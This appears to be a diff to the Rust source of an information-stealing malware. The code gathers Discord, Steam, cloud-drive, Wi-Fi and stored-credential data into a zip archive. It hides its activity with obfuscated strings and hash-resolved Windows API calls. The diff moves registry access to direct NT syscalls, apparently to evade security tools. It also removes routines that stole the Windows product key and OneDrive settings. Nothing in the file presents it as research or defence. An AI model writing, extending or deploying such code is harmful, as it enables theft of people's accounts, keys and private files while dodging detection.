@@ -17,7 +17,7 @@ use base64::Engine;
 
 use crate::fsutil::{read_file, walk_files};
 use crate::info::Info;
-use crate::resolve::{resolve, wide};
+use crate::resolve::resolve;
 use crate::zipw::ZipBuilder;
 
 const ONE_MB: u64 = 1024 * 1024;
@@ -349,38 +349,11 @@ fn collect_discord(zip: &mut ZipBuilder, info: &mut Info) {
 
 const HKEY_CURRENT_USER: usize = 0x8000_0001;
 
-/// Small local RegGetValueW string helper (sysinfo's is private). Reads a
-/// UTF-16 string value from any root key via the hash-resolved pattern.
+/// Small local registry string helper (sysinfo's is private). Reads a UTF-16
+/// string value from any root key via the NT syscall path (ntreg), falling
+/// back silently to hash-resolved Win32 when SSNs are unavailable.
 fn reg_read_string(hkey: usize, subkey: &str, value: &str) -> Option<String> {
-    unsafe {
-        let f: FnRegGetValueW =
-            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegGetValueW")));
-        if f as usize == 0 {
-            return None;
-        }
-        let mut buf = vec![0u8; 2048];
-        let mut len = buf.len() as u32;
-        let status = f(
-            hkey,
-            wide(subkey).as_ptr(),
-            wide(value).as_ptr(),
-            RRF_RT_ANY,
-            std::ptr::null_mut(),
-            buf.as_mut_ptr(),
-            &mut len,
-        );
-        if status != 0 || len < 2 {
-            return None;
-        }
-        let u16s = std::slice::from_raw_parts(buf.as_ptr() as *const u16, (len as usize) / 2);
-        let end = u16s.iter().position(|&c| c == 0).unwrap_or(u16s.len());
-        let s = String::from_utf16_lossy(&u16s[..end]).trim().to_string();
-        if s.is_empty() {
-            None
-        } else {
-            Some(s)
-        }
-    }
+    crate::ntreg::read_string(hkey, subkey, value)
 }
 
 /// Every plausible Steam root: default location plus registry-recorded custom
@@ -879,86 +852,6 @@ fn collect_loose(zip: &mut ZipBuilder, info: &mut Info) {
 // ---------------------------------------------------------------------------
 
 const HKEY_LOCAL_MACHINE: usize = 0x8000_0002;
-const RRF_RT_ANY: u32 = 0x0000_ffff;
-
-type FnRegGetValueW = unsafe extern "system" fn(
-    hkey: usize,
-    subkey: *const u16,
-    value: *const u16,
-    flags: u32,
-    pdwtype: *mut u32,
-    data: *mut u8,
-    cbdata: *mut u32,
-) -> i32;
-
-/// DigitalProductId (v3): 15 key bytes at offset 52, base24-encoded with
-/// dashes every 5 characters.
-fn decode_product_id(dpid: &[u8]) -> Option<String> {
-    let charset = crate::obf!("BCDFGHJKMPQRTVWXY2346789");
-    let mut key = dpid.get(52..67)?.to_vec();
-    let mut out = [0u8; 25];
-    for ch in out.iter_mut().rev() {
-        let mut acc: u32 = 0;
-        for b in key.iter_mut().rev() {
-            acc = (acc << 8) | *b as u32;
-            *b = (acc / 24) as u8;
-            acc %= 24;
-        }
-        *ch = charset.as_bytes()[acc as usize];
-    }
-    let s = std::str::from_utf8(&out).ok()?;
-    Some(
-        s.as_bytes()
-            .chunks(5)
-            .map(|c| std::str::from_utf8(c).unwrap_or_default())
-            .collect::<Vec<_>>()
-            .join("-"),
-    )
-}
-
-fn collect_product_key(zip: &mut ZipBuilder, info: &mut Info) {
-    unsafe {
-        let f: FnRegGetValueW =
-            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegGetValueW")));
-        if f as usize == 0 {
-            return;
-        }
-        let subkey = wide(&crate::obf!(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"));
-        let value = wide(&crate::obf!("DigitalProductId"));
-        let mut len = 0u32;
-        let status = f(
-            HKEY_LOCAL_MACHINE,
-            subkey.as_ptr(),
-            value.as_ptr(),
-            RRF_RT_ANY,
-            std::ptr::null_mut(),
-            std::ptr::null_mut(),
-            &mut len,
-        );
-        // ERROR_SUCCESS or ERROR_MORE_DATA (234); either reports the size.
-        if !(status == 0 || status == 234) || len < 67 {
-            return;
-        }
-        let mut buf = vec![0u8; len as usize];
-        let status = f(
-            HKEY_LOCAL_MACHINE,
-            subkey.as_ptr(),
-            value.as_ptr(),
-            RRF_RT_ANY,
-            std::ptr::null_mut(),
-            buf.as_mut_ptr(),
-            &mut len,
-        );
-        if status != 0 {
-            return;
-        }
-        let Some(key) = decode_product_id(&buf[..len as usize]) else {
-            return;
-        };
-        zip.add_file("System/ProductKey.txt", key.as_bytes());
-        info.add_app("Product Key");
-    }
-}
 
 // ---------------------------------------------------------------------------
 // Tier 4 gaming platforms
@@ -1192,133 +1085,16 @@ fn collect_gaming(zip: &mut ZipBuilder, info: &mut Info) {
 }
 
 // ---------------------------------------------------------------------------
-// Registry enumeration helpers (hash-resolved advapi32)
+// Registry enumeration helpers (NT syscalls via ntreg, silent Win32 fallback)
 // ---------------------------------------------------------------------------
 
-const KEY_READ: u32 = 0x20019;
-
-type FnRegOpenKeyExW = unsafe extern "system" fn(
-    hkey: usize,
-    subkey: *const u16,
-    opts: u32,
-    access: u32,
-    out: *mut usize,
-) -> i32;
-type FnRegCloseKey = unsafe extern "system" fn(hkey: usize) -> i32;
-type FnRegEnumKeyExW = unsafe extern "system" fn(
-    hkey: usize,
-    index: u32,
-    name: *mut u16,
-    name_len: *mut u32,
-    reserved: *mut u32,
-    class: *mut u16,
-    class_len: *mut u32,
-    last_write: *mut u64,
-) -> i32;
-type FnRegEnumValueW = unsafe extern "system" fn(
-    hkey: usize,
-    index: u32,
-    name: *mut u16,
-    name_len: *mut u32,
-    reserved: *mut u32,
-    typ: *mut u32,
-    data: *mut u8,
-    data_len: *mut u32,
-) -> i32;
-
-fn reg_open(hkey: usize, subkey: &str) -> Option<usize> {
-    unsafe {
-        let open: FnRegOpenKeyExW =
-            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegOpenKeyExW")));
-        if open as usize == 0 {
-            return None;
-        }
-        let mut out = 0usize;
-        if open(hkey, wide(subkey).as_ptr(), 0, KEY_READ, &mut out) != 0 || out == 0 {
-            return None;
-        }
-        Some(out)
-    }
-}
-
-fn reg_close(h: usize) {
-    unsafe {
-        let close: FnRegCloseKey = std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegCloseKey")));
-        if close as usize != 0 {
-            close(h);
-        }
-    }
-}
-
 fn reg_enum_subkeys(hkey: usize, subkey: &str) -> Vec<String> {
-    let mut out = Vec::new();
-    unsafe {
-        let Some(h) = reg_open(hkey, subkey) else {
-            return out;
-        };
-        let enumk: FnRegEnumKeyExW =
-            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegEnumKeyExW")));
-        if enumk as usize != 0 {
-            for i in 0..1024u32 {
-                let mut buf = [0u16; 256];
-                let mut len = 256u32;
-                let r = enumk(
-                    h,
-                    i,
-                    buf.as_mut_ptr(),
-                    &mut len,
-                    std::ptr::null_mut(),
-                    std::ptr::null_mut(),
-                    std::ptr::null_mut(),
-                    std::ptr::null_mut(),
-                );
-                if r != 0 {
-                    break;
-                }
-                out.push(String::from_utf16_lossy(&buf[..len as usize]));
-            }
-        }
-        reg_close(h);
-    }
-    out
+    crate::ntreg::enum_subkeys(hkey, subkey)
 }
 
 /// Enumerate values of a key: (name, REG_ type, raw data, ≤64KB).
 fn reg_enum_values(hkey: usize, subkey: &str) -> Vec<(String, u32, Vec<u8>)> {
-    let mut out = Vec::new();
-    unsafe {
-        let Some(h) = reg_open(hkey, subkey) else {
-            return out;
-        };
-        let enumv: FnRegEnumValueW =
-            std::mem::transmute(resolve(&crate::obf!("advapi32.dll"), crate::api!("RegEnumValueW")));
-        if enumv as usize != 0 {
-            for i in 0..256u32 {
-                let mut name = [0u16; 256];
-                let mut name_len = 256u32;
-                let mut typ = 0u32;
-                let mut data = vec![0u8; 64 * 1024];
-                let mut data_len = data.len() as u32;
-                let r = enumv(
-                    h,
-                    i,
-                    name.as_mut_ptr(),
-                    &mut name_len,
-                    std::ptr::null_mut(),
-                    &mut typ,
-                    data.as_mut_ptr(),
-                    &mut data_len,
-                );
-                if r != 0 {
-                    break;
-                }
-                data.truncate(data_len as usize);
-                out.push((String::from_utf16_lossy(&name[..name_len as usize]), typ, data));
-            }
-        }
-        reg_close(h);
-    }
-    out
+    crate::ntreg::enum_values(hkey, subkey)
 }
 
 fn reg_value_to_string(typ: u32, data: &[u8]) -> Option<String> {
@@ -1798,10 +1574,6 @@ fn collect_cloud(zip: &mut ZipBuilder, info: &mut Info) {
         if gdrive.is_dir() && add_tree(zip, &gdrive, "App_GoogleDrive", 4 * ONE_MB) > 0 {
             info.add_app("Google Drive");
         }
-        let onedrive = local.join(crate::obf!(r"Microsoft\OneDrive\settings"));
-        if onedrive.is_dir() && add_tree(zip, &onedrive, "App_OneDrive", 4 * ONE_MB) > 0 {
-            info.add_app("OneDrive");
-        }
     }
 }
 
@@ -1932,5 +1704,4 @@ pub fn collect(zip: &mut ZipBuilder, info: &mut Info) {
     collect_sticky_notes(zip, info);
     collect_wifi(zip, info);
     collect_credentials(zip, info);
-    collect_product_key(zip, info);
 }
